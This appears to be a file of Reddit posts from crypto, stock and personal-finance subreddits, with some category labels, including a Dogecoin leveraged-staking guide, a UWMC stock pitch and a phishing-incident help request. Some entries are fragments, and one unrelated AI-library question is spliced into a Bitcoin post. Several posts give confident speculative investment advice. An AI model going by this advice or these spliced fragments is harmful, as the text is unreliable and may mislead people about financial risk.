90. Once again we are the champions! Not just of github commits this time, but also of total staked asset value. [https://www.stakingrewards.com/](https://www.stakingrewards.com/)
91. Rick interviewed CardStarter which is a Cardano accelerator. The interesting items are 1) it appears they are purporting to somehow insure their community backers against certain financial losses with caveats, 2) they plan to fund projects prior to token launch through token vouchers, and 3) it sounds like they are building a DEX called Card Swap. Notice that the “insurance” comes with caveats. They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad? I have no idea. Watch the interview and form your own opinion. [https://youtu.be/nIklWKtr\_aY](https://youtu.be/nIklWKtr_aY) [https://cardstarter.io/](https://cardstarter.io/)
92. The Cardano Foundation has adjusted its delegation strategy. This brings up a question: where does the balance lie between allowing Adam Smith’s hidden hand to work its free market magic and trying to help small pools?

94. We’ve had really good reporting from the community on World Mobile developments with Cardano. I just want to take a second to thank you guys. Reddit user [/u/ricklepicklemydickle](https://www.reddit.com/user/ricklepicklemydickle/) first alerted us to the World Mobile developments and then youtube user [Whiskey 1234](https://www.youtube.com/channel/UCyBeEq-paultoA127TYcDjQ) (love both usernames btw) let us know that he attended a conference where he encountered World Mobile and “asked them if they knew about Cardano blockchain and the reply was they were announcing partners at the end of this month.” Thank you very much for this intel guys.This is what Army of Spies is all about. Many thanks for your contributions, gentlemen.

99. Kraken publishes a “What is Cardano?” article.   Says “...Cardano may not promise new ground-breaking features..” Oh yeah?  What about native tokens that don’t require smart contracts?  What about the EUTXO model allowing predictable and accurate local calculation of transaction fees in your wallet before you execute? What about a consensus algorithm that’s so good, another top 10 coin made their system derivative of it? That’s all standard these days?

\~Army of Spies",cryptocurrency
Bitcoin,Here is a simple mathematical formula that allows you to easily calculate what a Bitcoin should be worth to you.,"I would like to explain here a thought experiment (simplified for the post) that I have been using since 2017 to determine what I think is the most likely value of a Bitcoin in X years.

**Basics:**

Imagine a coin toss.

If the coin lands heads you get nothing, if the coin lands tails you get €10.

In our experiment, of course, this coin toss is not fair: probability for heads **1-p**, corresponding probability for tails **p**.

Unfortunately, the coin toss is not for free, participation costs.

So, what is the maximum price you should be willing to pay to participate in the coin toss.

Of course, the question of what you should be willing to pay for one Bitcoin (or for your coin toss) cannot be answered objectively.

The answer depends on your individual risk tolerance.

Here we simplify (to not make the post endlessly long) and **assume risk neutrality**.

That means you should pay for one BTC at most the expected value calculated in the following formula.

**The two scenarios:**

In the thought experiment, we consider the world in 9 years (i.e. 2030).

This point in time is arbitrarily chosen, you could just as well look 5 years or 150 years into the future.

(For the sake of simplicity, I will not discount payment flows here).

The most probable scenario for me and the one described here as a **positive scenario:**

BTC has established itself as a ""store of value"".

It has become a popular asset alongside gold, used by investors to hedge against certain risks. (FED go brrrrr)

The market capitalization of all BTC is **w%** of that of gold.

You can estimate the exact value for w yourself later.

w=50% means that in the positive scenario BTC will have a market capitalization of 50% of that of gold in 2030.

The **negative scenario** is easy to explain: BTC is worthless.

The probability **p** described above should now indicate how likely you personally think the positive scenario is. You have to estimate this value yourself.

**Do the experiment:**

1. think about what you personally think the market capitalization of BTC could realistically be in a positive scenario in 9 years relative to that of gold.

Write down this value as **w**.

**w** should be a number between 0% and 500% (or 50,000% - after all, this is about your estimation).

2.

How do you personally see the probability that the world develops in the sense of the positive scenario?

Write down this number as **p**, also as a percentage. ( 0% to 100%)

**What do I do now with these numbers?**

You know the market capitalization of gold. It is about 9,000 billion US$.

And we also know the market capitalization of BTC in the positive scenario (namely US$ 9,000 billion \* **w**).

To calculate the value of a BTC we simply have to divide the total caputalization of BTC by the number of BTC (21 million).

Specifically, this means for the value of a BTC:

US$9,000 billion \***w** / 21 million

or about **428,571 \* w**.

Now we still take into account our expected value **p**, our estimate for the occurrence of this specific positive scenario.

**428,571 US$ \*w \*p**

**Now put in your values!**

This gives you an (extremely) simplified estimate for the price of a BTC today that you might be willing to pay.

This formula has helped me for years in moments of weakness and doubt, especially during the last big drops or rises in value in recent years.

Without this formula, I would certainly not have kept up my HODL strategy so consistently.

1. Are there any pre-trained or prebuilt models out there that I could use for this? I've found that the open-source Pavlov AI library has some interesting ones.
2. Which models would suit this task the best?

dogecoin,Consider this DOGE fans...,"The target rate of inflation as set by the Fed is 2%.

2% of $1,000,000,000,000 is much more than 2% of $100 or even how much DOGE has currently been minted (not considering the amount lost and destroyed only the amount created to date). Regardless the federal reserve (which is neither federal nor a reserve) targets this rate of inflation every year 2% with no mention of the current money supply (this is criminal) and will into the foreseeable future. With periodic increases in between to offset for the government's loving charities of course. This is a tax on you. This is a tax on the poor in particular.

Consider the goals of the Fed. They are to manage monetary policy with the express aim to control unemployment or in more simple terms to keep you poor enough and consuming enough so that you continue to work and turn the gears of the economy. They exist to manipulate the market. There is a reason Andrew Jackson was elected back in the day and it was to prevent a central banking system.

I won't get too much more inside this thing than this with you people, but consider that the rate of inflation for Dogecoin decreases with every subsequent block that is mined. Consider that there are fewer digital Dogecoins in circulation than USD. On the basis of supply and demand the only thing stopping this rocket is widespread adoption. Which will happen in time, but not without its shakeouts, but also not without popular demand.

DOGE is already worth more than USD. All you gotta do is get the merchant class to accept it and actually spend the stuff like currency. Keep the fees low, the transactions fast, create a system for reversible transactions, maintain opensource neutrality and boom...you're on the moon.

personalfinance,"Have to buy a car, not sure what my best option is. Advice very much appreciated","I’m moving across the country and will need a car (LA). My current car, which I own, has about 300k miles. I’m selling it for $1300. 

Originally, my plan was to buy a used honda for about 10-15k with cash. This would require me to save for a couple months, but I’m fine with that.

My parents are adamant that it would be smarter to put down a down payment for a new car. After doing research, it seems like that would require ~3000 down + $200-300 monthly for 62 months. I’m not really comfortable with that and fail to see how that’s a better financial decision than buying used.

It’s true, the used car market is awful right now. But through research, I’m fairly confident I’d be able to buy a used honda for about $12k with less than 99k miles and a clean title. As a honda person, this seems great as typically hondas have lasted me well beyond 300k miles. Is my research sound or am I seeing scam listings?

Finally, if I didn’t want to wait to save up and pay with cash, is it possible to finance a used car? If so, are terms reasonable or should this be avoided? Most attractive listings are for sale by owner, does this mean financing would require a bank loan? I’ve never taken a loan out or financed a car so I’m wary if interest rates. I’m also concerned about buying a lemon. Any way to protect myself against that?

Bitcoin,This is why I won't sell any of my BTC in this bull market,"1. I do not need fiat right now, actually I am buying a house but the interest rates are so low (0.39%) that I would be crazy not to take out a loan.
2. Other option is to sell high and then buy back at lower price. But then I have to perfectly time the top and again buy the bottom. I have to be right 2 times which I believe is not possible. In addition I have to pay 39% tax on capital gains so i have to wait at least for 40% dip to have the same amount of BTC as I started with. And who knows how low will it go in this cycle.
3. The last reason is that I believe this is my once in a lifetime opportunity to FIRE.

Edit: To explain the second point a little bit as there is a lot of missunderstanding. If I sell now, almost the entire price is my gain. I have to pay 39% tax in Slovakia (this is true even if it is unbelievable for someone). My goal is to have more BTC, not more fiat so BTC have to drop more than 40% to make this trade profitable for me. I am not a trader so I do not believe I can time the top and the bottom of the cycle, nobody really can. So my strategy is to hold it until I can retire earlier or I really need the money.

I understand you have to pay PMI but that's usually around 1% per year. The stock market over time returns 7% per year, so if you can borrow money at 4% (3% mortgage+1% PMI), why would you put down 20%?

I understand that some people feel more comfortable with a lower housing payment, but if this is the case then you probably can't afford the house to begin with. It just doesn't make sense to tie up so much of your $ into an asset that returns close to inflation.

In addition, if you put all of your savings into a 20% down payment then you now have a higher risk of exposure in case of job loss/etc. when all of your money is tied up into a mortgage.

I am starting my first job as a contractor soon. This will be completely different than what I'm used to because I have always been a W2 employee. I haven't signed any documents yet, but my assumption is that it will be a 1099 document since I've already signed the ""Contractor"" agreement until they can finalize payroll in my state. However, I'm not sure how long that will take and frankly, I'm not too concerned at this time because the raise I get by switching jobs is a dramatic increase than what I'm making now. 

Here is the information:

**Known information**

* Married
* My income will be $100,000/yr contract
* Wife's income is \~ $57,000 a year W2
* Live in Colorado

**Think I know information (based on** [**https://www.keepertax.com/self-employment-tax-rate-calculator**](https://www.keepertax.com/self-employment-tax-rate-calculator)**)**

* Self-employment tax: 15.30%
* Federal income tax: 6.13%
* CO State income tax: 1.83%
* Totally I need to save 17.71%

**Questions I have**

1. Should I be entertaining the idea of my wife and I filing separately next year? Or is filing jointly still the best option?
2. Are those numbers right? So if my paycheck is $1900/a week should I be saving \~340 for taxes at the end of the year?
3. I've seen things about people paying taxes quarterly, is this a better option than paying yearly? Or is it more beneficial to put this money saved every week into a high-interest savings account that I can use during tax time and earn a bit of interest along the way?
4. My employer doesn't have 401k, but I have my own accounts. I actually have three that I don't fully understand and I will probably have to call Vanguard to discuss with them. I have two Rollover IRA accounts. I think one is pre-tax and the other is post-tax. I also have another IRA account that I'm not quite sure why they it isn't combined with another one.

CryptoCurrency,"Unpopular Opinion: Blockchain doesn't need ''utility'' tokens, making most worthless.","**Blockchain before Bitcoin:**

Blockchain as a data structure existed before Bitcoin even was released, chunks of data that includes the hash of the previous block. ''In 1991, Stuart Haber and W. Scott Stornetta invented the blockchain. Yes, 17 years before the release of the Bitcoin paper, the main idea behind cryptographically linking blocks in an append-only data structure was published in an academic paper. By storing hash values in a timestamped block on the blockchain, one can prove that a document existed at a certain time in a certain version. This has many applications, ranging from registering intellectual property rights to contract arbitration.''

**Satoshi:**

What Satoshi did with Bitcoin is adding Proof of Work and an incentive (mining) to the works of Stuart Haber and W. Scott Stornetta to make the blockchain decentralised &amp; solving the double-spending problem. This is of course useful when a coin is used as an actual currency, it needs a public chain. Pure currency coins can't function without the token itself, but most utility token projects definitely can.

**Ripple:**

Ripple is a company that provides payment solutions to its customers through RippleNet. It uses an API that makes cross-border payments faster &amp; cheaper. The thing is though, it functions perfectly without the need of XRP, its native token. Companies of course can choose to use On-Demand Liquidty, but it's not necessary for the cheaper &amp; faster payments. It saves some extra on the transfer fees, but the system functions perfectly fine without it.

**R3 Corda &amp; IBM Fabric:**

**Corda:**

Transactions on Corda are linked/ chained the transactions it depends upon, so we can say it's a blockchain.

''Corda does *not* periodically batch up transactions needing confirmation — into a *block —* and confirm them in one go. Instead, Corda confirms each transaction in real-time. With Corda, there is no need to wait for other transactions to come along or a “block interval”. Transactions are confirmed immediately. This means that your transaction is not dependent on any others, increasing both privacy and scalability.''- R3 Corda.

R3 doesn't use a token to settle transactions, yet it works perfectly fine without it. They're building the largest DLT ecosystem at an extremely fast rate, some partners are IBM, Amazon Web Services &amp; Accenture.

**IBM:**

''Hyperledger Fabric, an open source project from the Linux Foundation, is the modular blockchain framework and de facto standard for enterprise blockchain platforms. Intended as a foundation for developing enterprise-grade applications and industry solutions, the open, modular architecture uses plug-and-play components to accommodate a wide range of use cases. It has advanced privacy controls so only the data you want shared gets shared among the “permissioned” (known) network participants.''

Smart contracts document the business processes you want to automate with self-executing terms between the parties written into lines of code. The code and the agreements contained therein exist across the distributed, decentralized blockchain network. Transactions are trackable and irreversible, creating trust between organizations. This enables businesses to make more informed decisions quicker — saving time, reducing costs, and reducing risks.''

Some of the companies partnered with Hyperledger: J.P Morgan, IBM, Accenture, American Express, Bosch, Huawei, FedEX, Lenovo, LG, Samsung, and a whole lot more (see Hyperledger site). Same story with Corda, they're bringing blockchain technology to companies without ever using a single token that's being used for transactions or staking.

**Conclusion:**

I highly doubt that companies will ever actively use a public blockchain (companies prefer to keep things private) and instead will use IBM or Corda's services if they need them. Most utility tokens are either created to get funding for the project or to attract investors in general. Blockchain doesn't need utility tokens for transactions, although it's ''needed' for pure crypto coins like Bitcoin, LTC, Nano.",cryptocurrency

All clients are at risk but one is more targeted then others which I will go into. Hopefully you guys can review and point me in the right direction.  

First we realized that this client was getting successful sign-ins from random IP addresses across the country which was a clear red flag. Then we noticed that there was a clear domain that was spoofed under the guise of one of our clients. They changed the 'I' to a 'l' and had the username match the email address of the client. If our clients email was [user@liv.com](mailto:user@liv.com) the spoofed emails that was sent to one of their main vendors looked like this ([user@liv.com](mailto:user@liv.com) &lt;[user@Iiv.com](mailto:user@Iiv.com)\&gt;). This was a clear phishing attempt but we found where the domain was hosted and were able to get them shut down. We immediately ensured 2FA was pushed to each of our clients users to try and mitigate any further sign ins. But, little did we know this is just the beginning. 

Its been about 4 days and now this client is telling me that they are getting hundreds of emails from not just one vendor but almost every one of their clients is receiving emails from a spoofed email under random domains now, but with our client's owner's name and email address. ([user@liv.com](mailto:user@liv.com) &lt;user@randomdomain.com&gt;) . It appears they got access to their client list and I am having a very hard time trying to figure out how to stop these attacks. I know its hard with spoofing emails that are being sent out under the guise of our clients, but I really need some tips on how to handle a situation like this. \*Another thing to note is that when the clients get the spoofed emails a lot of them are disappearing when they open them, or when they try to forward. Not sure how this is happening at all. If anyone has been in a similar situation please give suggestions. 

P.S Sorry if this isn't the easiest to follow I was kind of scrambling lol but I will provide any additional information if requested to help diagnose/neutralize this issue.",technology

personalfinance,Is there a better/cheaper/more efficient way to do our taxes?,"Hi My husband and I every year file joint personal taxes.  I am primary because I have an employer, and my husband is a sole proprietor (guitar instructor) based out of our home.  

Every year since 2012  the price we pay the person who does our taxes goes up, and each year we have owed both State and Federal.  Yes, our income has gone up a little each year, but, we are still under $60,000 in income.  But our biggest issue seems to be getting together all the itemized expenses together for our tax preparer. 

We use Paypal to get our invoices out to students.  So that shows proof of income for the year but we have to extract all the fees and add them up ourselves,  so they can be used as write-offs, but Paypal doesn't seem to have a system to tallie all these items for each month or the whole year.  My husband uses Amazon for most of his office expenses and we can easily extract those monthly amounts. 

 If there is an easier program we can use to help itemize expenses and we are able to do invoices as well, to make doing our taxes less cumbersome to get done.  Your kind help and advice would be appreciated. Thanks",finance

Our current rate is 4.5% and they are offering 3.875% for a 15 year loan. We have owned the house for 10 years. I'm failing to see the downfall of this if it is in fact a no cost refinance. We would cash out some money to help with the debt and to make some improvements on the house.

\- Token usage is yet to be confirmed but can be staked into a community pool for a % gain in tokens

\- Which legislation am I to abide by since I would not be fixed into a single location?

\- Are Tokens considered intangible assets therefore not being a security?

\- Could I settle with a virtual address and simply abide by the legislation of that province or foreign country?

stocks,"Here is a Market Recap for today Tuesday, April 27, 2021","**PsychoMarket Recap - Tuesday, April 27, 2021**

Stocks turned modestly lower Tuesday, as market participants awaited for more corporate earnings results and commentary from members of the Federal Open Market Committee (FOMC), including Federal Reserve Chair Jerome Powell.

This week, a slew of huge companies are set to report corporate earnings for the first quarter of 2021. Altogether, the market caps of the companies reporting this week comprise nearly half the total market cap of the S&amp;P 500, according to FactSet. So far, the vast majority of companies have vastly exceeded analyst estimates, with effective vaccine distribution in the US helping stoke demand as the economy gradually reopens. 

Eighty-four percent of the S&amp;P 500 companies that have reported first-quarter results to date posted a positive earnings per share surprise, according to data from FactSet. This would mark the highest percentage of companies reporting upside surprises since FactSet began tracking this metric in 2008, assuming this beat rate holds through the end of earnings season. 

Today kicked off the first of the FOMC’s two-day rate-setting meeting. The event is extremely unlikely to lead to any major shifts in monetary policy, with officials reiterating their commitment to keeping policy highly accommodative as the economy continues to recover from the pandemic. This includes maintaining interest rates near zero and maintaining an aggressive asset purchasing program at a monthly rate of $120 billion. In an earlier meeting, Powell said the Central Bank would slow the pace of its bond purchase program “well before” raising interest rates. Powell said, “We will taper asset purchases when we’ve made substantial further progress toward our goals from last December when we announced that guidance. That would in all likelihood be well before the time we consider raising rates.”

In other news, according to a report by the Conference Board, consumer confidence has surged to a 14-month high in April as effective distribution of the vaccine and easing of social distancing guidelines in the US allows for the economy to gradually reopen. The Conference Board's monthly consumer confidence index jumped to a reading of 121.7 in April, or well above the 113.0 expected. Lynn Franco, senior director of economic indicators at the Conference Board, said in a statement, “Consumers’ assessment of current conditions improved significantly in April, suggesting the economic recovery strengthened further in early Q2. Consumers’ optimism about the short-term outlook held steady this month. Consumers were more upbeat about their income prospects, perhaps due to the improving job market and the recent round of stimulus checks.”

personalfinance,Is taking out this much money in private loans a stupid move?,"So, I will be doing a two year nursing program to get my bsn ( credits were transferred from my first degree to account for the first two years of nursing school). I am currently in debt $10,100 in federal loans.

In total I expect to be paying $50,000 for the schools tuition. $18,900 of this will still be covered by the federal government. So that leaves a total of $31,000 left. Another source of federal aid is my mom applying for a parent plus federal loan, which would give me an additional $5,000 per year. Leaving me with $21,000 left.

Really the only other option is private loans. The nursing school I will be attending does give out $10,000 scholarships per year (as long as a 2.75 gpa is maintained), but I won’t know if I’m offered that until sometime in the fall semester ( if I were to get that, that would leave me at $11,000 left to take out in private loans).So the most concrete way of paying is through private loans (right?)

Is $21,000 an excessive amount of money to take out in private loans? I was thinking of doing it through discover’s student loans, but if anyone has any other suggestions let me know. Also, do private loans affect your credit score?

While in school I will be living with my grandparents and transportation costs should not be an issue.

dogecoin,Staking Dogecoin on the Venus lending protocol on Binance Smart Chain,"Doggy Doggy what now?

That's right. That's a lot of big words. Don't worry, I'll go through them one by one and bear with me, it's worth it. You're gonna earn interest on your Doge and will also be eligible for free coin distribution. Sound awesome right? Well hold your Doggies, we'll get there.

# Staking

Ok so what's staking in the first place? Staking is the fancy word we in the DeFi space (Decentralized Finance, sorry) use when we lock our coins up in a smart contract. Why would you do that? Cause you earn interest. For example those of you who are familiar with Cardano should already know that you can stake Cardano inside the wallet and earn interest on them as long as you don't move them. In the case of Cardano you're getting paid for securing the network (Proof of **Stake)**

So can you stake Doge to earn interest? Short answer: Yes. Long answer: It's a little more complicated, we'll need a few steps

# Binance Smart Chain

What's Binance Smart Chain (or short BSC)? Well basically BSC is the chinese imitation of the Ethereum network. No really. It uses the exact same code, except that the GAS fees (paid in BNB and not in ETH) are MUCH MUCH lower. You probably heard of Pancakeswap and all these mooncoin (scams) popping out left and right, but maybe never understood how to use it. Well you're in luck, I'm gonna tell you in the next step which is

# Metamask

What is Metamask? Metamask is a browser extension that allows you to use a Crypto Wallet in your Browser. It's the go to App to use d(ecentralized) Apps. First of all install Metamask. Then you need to start and create your wallet. Make sure you write down your seed phrase. THIS IS A REAL WALLET. This is not a wallet on an exchange. If you lose your private key and your seed phrase there is no way to recover your funds if you forget your password. So make sure you keep your Seed Phrase somewhere safely. We are actually diving into the actual crypto world now. Now the thing is. This is an ETHEREUM wallet. You cannot send your Doge there. Don't do it. They'll be lost for ever. We're gonna need to tweak Metamask a little bit.

Setting Metamask to BSC

Here's the full guide. But I'll summarize quickly. You'll need to go to **settings -&gt; network -&gt; add network** then you need to punch in these parameters

Mainnet

**Network Name:** Smart Chain

**New RPC URL:** [https://bsc-dataseed.binance.org/](https://bsc-dataseed.binance.org/)

**ChainID:** 56

**Symbol:** BNB

**Block Explorer URL:** [https://bscscan.com](https://bscscan.com)

and boom you're good to go. Your Metamask wallet can now be used on the Binance Smart Chain.

So can you send your Doge to this address now? HELL NO. We're still not done. We still need more steps.

# Sending Doge to the BSC wallet

So next we want to send Doge to your BSC wallet. How? Well the easiest way is to just get a Binance account. Send your Doge to Binance. There send them to the **BEP20** address. This is important. BEP20 remember that. You paste your wallet address into Binance BEP20 withdrawal and boom, you're good to go. Your Doge gets sent to your Metamask wallet. Now you got your Doge onto the Binance Smart Chain. Congrats! Oh and make sure you also have BNB in your wallet, otherwise you won't be able to move your Doge.

# Venus

You've finally made it. Your Doge is on BSC. So what the hell was that all for? Well now you can finally use dApps and Defi! You're free to explore the wonderful world of BSC DeFi, but first let's start with Venus. That's why you're here right?

Well what the hell even is Venus? Venus is a lending protocol, like AAVE on Ethereum. On Venus you can for example stake Bitcoin and earn interest on them. How? Well if you stake your coins there you can loan other coins and pay interest on them. It's a true free market where interest is determined by supply and demand. And now you can stake your Doge there and earn &gt;5% interest as of the writing of this post. But not only that. You can now BORROW money like Tether or USDC or DAI and do with that whatever you want. For example you can use it to buy more Doge and stake that again! Sounds like cheating? Well it comes with risks. But first let's do a littel example.

Let's say you have 100$ worth of Doge. on Venus. You can now borrow say 30$ USDT and buy Doge with them and stake them again. Boom you now have 130$ in Doge from an investment of 100$. Effectively this is a leverage. So be careful. If your Doge rapidly loses in value and isn't enough to secure your loan, it will get **automatically sold** to repay the loan. So maybe if you want to be safe, just stake. But you should just know, this is a great way to buy dips, without actually spending new money! If you feel like Doge has bottomed out after a dip, why not use your Doge as collateral for a loan and buy more Doge? The only thing you're risking is your Doge.

# Is this really worth it?

Sounds like a lot of work for a measely 5%, huh? And you're right, it is. In crypto 5% is nothing. (Assuming you're not a Doge millionaire and planning to live of your interest rate) The point of this is:

I think Doge is a GREAT way for people to get into crypto and I welcome DeFi protocols accepting Doge and I think it's a good excercise to dive into this deep mystic world of DeFi where others have become millionaires and you don't even know what that is. You'll learn to appreciate the usecases of DeFi loans. For example. **You never need to sell your Doge again.** Instead of selling, if you need money, you can instead loan against Doge. If everyone does this, this will greatly increase the price stability of Doge. It allows you to buy dips without putting more money in. And it makes it very easy to get into other cryptos because you can use loans to diversify. So basically, I feel like this is a good way to really dive into the world of crypto and understand what all this hype is actually about and what a true free market without restrictions feels like.

If something is confusing, feel free to ask in the comments, I'll try to answer as many questions as possible. Hope someone reads this post at all lol. Anyway cheers.

Bitcoin,Keeping full control of your keys is not compatible with mass adoption,"Bitcoin is not a payment aggregator, Like Visa or Paypal, but a settlement system like Fedwire.

Mastercard and Paypal aggregate payments on top of the dollar monnetary system, whose last transactions settlement system is Fedwire, which processes roughly the same amount of transactions as Bitcoins does.

Services like banks, Visa, Mastercard, Paypal, etc, aggregate payments on top of fedwire, and they are starting to do the same on top of Bitcoin's monnetary system

When you put Dollars in your bank, you lose control of your dollars but you gain access to the payments aggregation: virtually free payments.

Mass adoption means that banks, Mastercard (ongoing), Paypal, etc, etc will start to aggregate payments on top of Bitcoin's monnetary system, keeping care of your funds and keys the same way they do with dollars (just like exchanges do already).

This is the future, and refusing that path is equivalent to refuse mass adoption.",cryptocurrency
stocks,UWMC A Fundamental Analysis of why this stock is deeply undervalued - The Latest in a Series,"Hey /r Stocks. Admittedly, i usually post this elsewhere, and my series of Due Diligence on this stock is posted elsewhere, but I thought that you guys could actually value this stock on deep value metrics. Please be aware this DD is a day old, and the stock has now been up for the last 5 trading days.

Greetings and salutations. I wrote my last DD on UWMC 2 weeks ago, and it was the latest of a series. With Earnings announced, and the recent runup from its lows, I thought an update was in order as there's a lot of new information to parse through.

First, a status update on the stock price movement itself. After my last due diligence, the stock continued a downward trend down to 7.18 (for a 5.55% Dividend if you bought at that price point!), before it started sharply reversing course after a Barclay's Analyst initiated Coverage with a 10$ price target stating that FY 2022 EPS was roughly 6.5 Forward Earnings for 2022, and that UWMC was poised to grab more market share. This was amid a prior backdrop of positive news coverage about how undervalued the stock was, and how it was almost inexplicable (Spanning The Motley Fool, Investor Place, and SeekingAlpha) in the days prior to this analyst coverage.

The Stock has been positive the last 4 trading days, and sharply so. It is up 9.49% on the week, and 13.5% from it's low point intra-week, and stands at $8.19 right now. That means it still has a dividend yield of 4.88%. With Earnings in two weeks, share-price appreciation is sure to follow.

Second, I wished to speak about long term prospects for the stock. As you might know, the U.S. is around 4 Million Home's short of buyer demand, as home-builder hesitation over the last decade has led to a meaningful undersupply as Millennials age, and will continue to age into their prime home buying years over the next few years. (*WSJ, ""* U.S. Housing Market Is Nearly 4 Million Homes Short of Buyer Demand."" Furthermore, ""Home builders would need to construct between 1.1 million and 1.2 million single-family homes a year to meet long-term demand, but the start rate would need to be even higher to shrink the existing deficit, said Rob Dietz, chief economist at the National Association of Home Builders."" Id. That means that homebuilders would need to build over 1.2 Million homes to even -start- to cut into the 4 million deficit of homes. However, fret not because...

That's because ""housing starts surged 19.4% to a seasonally adjusted annual rate of 1.739 million units last month."" which beat economist expectations of 1.61. (Reuters, U.S. housing starts near 15-year high; consumer sentiment rises moderately). This is as home prices in the U.S. soared 18% year-over-year in March 2021 to a median of $356,000, meaning that originations grew, and partially offset the slightly shrinking inventory and thus sales (Housingwire, ""Home prices soared in March amid record demand""). What further offsets this, is the increase in refinance and home purchase applications as rates have declined to below 3% for the first time in months. (Forbes, ""Mortgage Rates Hit Levels Not Seen In Months""). This has led to a refinance surge of 10%, and applications to purchase a home were 6%). This should allow brisk business in Q1 2021, and as refinance activity starts slowing further in the year, there should be more inventory allowing purchases to help make up the shortfall. Considering UWMC has a .15% advantage on rates, this should bode well for them.

While 2022 price increases for homes should be more subdued due to lower timber and associated materials cost, as well as more labor, they are still expected to rise. Furthermore, the purchase market is going to grow in 2021 from 2020, and beyond. The Mortgage Bankers Association (MBA) announced today at its [**Spring Conference and Expo 2021**](https://nam11.safelinks.protection.outlook.com/?url=https%3A%2F%2Fs3141176.t.en25.com%2Fe%2Fer%3Futm_campaign%3DMBA%2520Spring%2520Forecast%2520Release%2520-%25204-22-21%26utm_medium%3Demail%26utm_source%3DEloqua%26s%3D3141176%26lid%3D4748%26elqTrackId%3D370E3664A52473C73B49C93E9CDC87D2%26elq%3D25b31323597b436aac47d90e1427d551%26elqaid%3D1460%26elqat%3D1&amp;data=04%7C01%7Cftaylor%40mba.org%7C7c50297093de479245f008d9059eadeb%7C867e5d11bde4499fb45e61572f9f337c%7C1%7C0%7C637547001352783149%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C1000&amp;sdata=tZj6grBtgKax8K8BkZcaUb3m%2F9NF4R4%2FoB5hFMipd44%3D&amp;reserved=0) that purchase originations are on track to grow 16.4% to a new record of $1.67 trillion in 2021. The MBA forecasts volume to fall 14% this year to $3.28 trillion, which would still be the third-highest total ever. Fannie Mae and Freddie Mac are more optimistic with Fannie May Predicting $4 Trillion in Mortgage Originations in 2021, and Freddie Mac is predicting $3.5 Trillion in Mortgage Originations in 2021. With that said Fannie Mae recently revised upward from that 4 Trillion Number.

This is what Fannie Mae Predicted in their upward revised predictions:

""Consistent with a stronger home price growth forecast, the outlook for purchase mortgage originations has been boosted by $66 billion for 2021 and $84 billion for 2022 to $1.9 trillion each year compared to the March forecast. Refinance volume is unchanged at $2.1 trillion for this year and will decline 48 percent next year to $1.1 trillion, a $40 billion downward revision from the previous forecast. Around 42 percent of all outstanding mortgages have at least a 50-basis point incentive to refinance at current rates, which is down from nearly 70 percent at the end of 2020. "" -- April 16, 2021.

Finally, I expect interest rates to stay level or even dip more as people flock to TIPS- [Investors Stay Hungry for Inflation-Protected Bonds - WSJ](https://www.wsj.com/articles/investors-stay-hungry-for-inflation-protected-bonds-11619461270) , and as foreign investors continue to purchase Treasuries (Though I am not sure how much stronger demand will be as they've already returned).

Finally, I'm going to talk about what can be expected regarding Earnings and leading up to it:

1. MSR Asset Value will increase organically as interest rates from Feb 2 were at 1.1% roughly (WSJ 10 YR Treasury Table), and have increased to roughly 1.56%. As Interest rates go up, the value of MSR's go up and this asset is continuously adjusted each quarter as a result.
2. With a Net Income of roughly 1 Billion this quarter at minimum, and a Shareholder's Equity at 2.374B, there will be a Return on Equity of 42.1% on this quarter alone, and the ROE will easily lie between 100 and 200% for FY 2021.
3. The Annual Income Yield, and the interest on the 2025 Senior Notes and 2029 Senior Notes comes to 41.5 Million, and 81 Million Respectively. This is very, very, easily serviceable. (Class A Shares are dividend shares, where Class D stocks held by the owner are not). This is incredibly bullish, as the CEO would prefer to put the money he otherwise would have gotten back into the company to grow it. If his Class D shares were Class A shares, the Annual Dividend would be 640 Million. The Payout Ratio is still very low, but i believe their CEO would rather use the money to eat market share and grow his company rather than be issued a dividend. At least at this point in time.
4. The Senior Note Raise of 700 Million for 2029 will prove to have been a bullish indicator as you need capital to originate loans, and to secure more Mortgage Servicing Rights. The Mortgage Servicing Rights, will provide a constant stream of Cash Flow as well. The Company made over 3.38 Billion Dollars in Net Income last year, and is on pace to have a similar tally this year (Though not quite as high), because their bread and butter is purchase as opposed to refinance. Purchase's have outpaced refinance at times this year, and going forward into the second half of this year it's going to remain that way. UWMC does better in this environment, and it will be able to gain and sustain market share as a result.
5. RKT Earnings are on May 5th, and I expect a sympathy move for UWMC.
6. May 7 is when Russel Reconstitution Preliminary List comes out, and I expect UWMC will be there.
7. May 10 will be Earnings, and May 11 will be the Call with Analysts to discuss results. I think we can expect some heady things.

personalfinance,Unexpected Financial Gain at 22 - Don't Want to Mess it Up,"Hello, everyone. I put a TLDR at the end, but wanted to share my story for anyone who is interested. 

Very unexpectedly, what started out to be my financial nightmare has turned into my financial miracle.

To make a long story short: Bought my first house at 19 (by myself), and less than a year later ended up having to sue the previous owners for non-disclosure/fraud (spent about $20K on lawyers fees etc.), received only a $60K settlement for repairs that were expected to cost around $90K...and ever since, have been working a full-time job, part-time job, and trying to juggle a couple of online classes every semester. I put the $60K in a brokerage account hoping it would have some growth to help me bridge that gap.

Since then, I met my boyfriend and we decided earlier this year that it was time for me to try to figure out how to get the repairs taken care of and put the house on the market. Working with various contractors/engineered, we figured out a more economical way to resolve the problems with the house for about $15K, put on a new roof, gutters, did miscellaneous other repairs, and I listed my house for $229,000.

After paying for all the repairs, and the growth my account saw, I had approximately $45K in my brokerage account and a mortgage payoff amount of $203K. If my house would have sold for list price, I wouldn't have made too much off of it, and probably would have ended with a net $20-$30K...but to my surprise, I got an offer of $267,500 with no contingencies. I accepted this offer a few weeks ago.

I am still in shock, I am now going to have an additional \~$40K fall into my lap....leaving my brokerage account with around $80-90K.

The only debt I have is my car loan, at 3.82% and 57 months left to pay ($545.79 monthly payment), and I already contribute 5% (the amount my employer matches) of my paycheck into my retirement. The guy who manages my brokerage account suggested I start contributing the max amount into a Roth IRA...but since the max contribution isnt that much I am still left with a decent chunk of change.

I really don't want to mess this opportunity up, and want to set myself up for success. 

